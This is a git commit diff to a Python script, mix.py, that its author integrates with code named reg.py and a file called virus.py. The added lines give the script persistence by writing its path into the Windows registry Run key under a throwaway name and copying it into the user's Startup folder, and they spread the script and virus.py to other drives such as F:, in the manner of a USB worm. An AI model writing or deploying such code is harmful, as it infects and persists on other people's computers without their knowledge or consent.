c96ae843c3a718a649bfb15b50fc37b193aacf8f
Nasser <hizenbergabc@gmail.com>
2020-01-25 22:09:17 +0330

    add all code of reg.py to mix.py and integration them

--- mix.py
+++ mix.py
@@ -1,5 +1,6 @@
 import shutil
 import ctypes
+import winreg as reg
 import time
 import os
 
@@ -10,6 +11,16 @@ while True:
     time.sleep(3)
     pwd = os.getcwd()
     timer += 1
+# those code it's for move mix.py to registry windows
+    pth = os.path.dirname(os.path.realpath(__file__))  
+    s_name="mix.py" 
+    address=os.path.join(pth,s_name) 
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
+    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
+    reg.CloseKey(open)
+    
     if pwd == 'F:\\': #1 
         for x in flash :
             try:
@@ -32,7 +43,16 @@ while True:
         except:
             print('error 2')
             pass
-
+        
+    elif pwd == 'g:\\': #4
+        try:
+            cp_virus = shutil.copy('virus.py','f:')
+            cp_mix = shutil.copy('mix.py','f:')
+            cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
+            print('run 4')
+        except:
+            print('error 4')
+            pass
     #3   
     elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user :
         try:
